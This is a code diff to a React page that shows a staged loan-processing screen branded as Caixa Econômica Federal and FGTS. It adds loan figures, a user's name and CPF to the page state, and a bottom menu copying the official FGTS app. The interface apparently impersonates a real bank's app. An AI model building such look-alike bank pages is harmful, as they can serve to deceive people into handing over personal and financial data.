@@ -1,7 +1,7 @@
 
 import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
-import { Loader, Check } from 'lucide-react';
+import { Loader, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
 import { useIsMobile } from '@/hooks/use-mobile';
@@ -13,9 +13,24 @@ const LoanProcessing = () => {
   const [currentStep, setCurrentStep] = useState(0);
   
   // Get the selected bank data from location state
-  const { bankLogo, bankName } = location.state || {
+  const { 
+    bankLogo, 
+    bankName,
+    totalAmount,
+    installmentsCount,
+    installmentValue,
+    interestRate,
+    userName,
+    userCPF
+  } = location.state || {
     bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
-    bankName: "Caixa Econômica Federal"
+    bankName: "Caixa Econômica Federal",
+    totalAmount: 10000,
+    installmentsCount: 60,
+    installmentValue: 250,
+    interestRate: 0.018,
+    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
+    userCPF: "123.456.789-00"
   };
 
   // Processing steps
@@ -39,7 +54,16 @@ const LoanProcessing = () => {
       // Navigate to the contract page after completing all steps
       setTimeout(() => {
         navigate('/loan-contract', { 
-          state: { bankLogo, bankName, ...location.state } 
+          state: { 
+            bankLogo, 
+            bankName, 
+            totalAmount,
+            installmentsCount,
+            installmentValue,
+            interestRate,
+            userName,
+            userCPF
+          } 
         });
       }, 500);
     }
@@ -47,7 +71,7 @@ const LoanProcessing = () => {
     return () => {
       clearTimeout(stepTimer);
     };
-  }, [currentStep, steps.length, navigate, bankLogo, bankName, location.state]);
+  }, [currentStep, steps.length, navigate, bankLogo, bankName, location.state, totalAmount, installmentsCount, installmentValue, interestRate, userName, userCPF]);
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
@@ -107,9 +131,37 @@ const LoanProcessing = () => {
             </div>
             
             {/* Animated loader at the bottom */}
-            <div className="animate-pulse flex items-center justify-center mt-8">
+            <div className="animate-pulse flex items-center justify-center mt-8 mb-16">
               <Loader className="w-8 h-8 text-[#005CA9] animate-spin mr-2" />
               <span className="text-[#005CA9]">Aguarde um momento...</span>
+            </div>
+          </div>
+        </div>
+        
+        {/* Footer */}
+        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
+          <div className="flex justify-around items-center py-3">
+            <div className="flex flex-col items-center text-gray-500">
+              <Home size={24} />
+              <span className="text-xs mt-1">Principal</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <BarChart3 size={24} />
+              <span className="text-xs mt-1">Meu FGTS</span>
+            </div>
+            <div className="flex flex-col items-center">
+              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
+                <DollarSign size={24} className="text-white" />
+              </div>
+              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <HelpCircle size={24} />
+              <span className="text-xs mt-1">Ajuda</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <MoreHorizontal size={24} />
+              <span className="text-xs mt-1">Mais</span>
             </div>
           </div>
         </div>
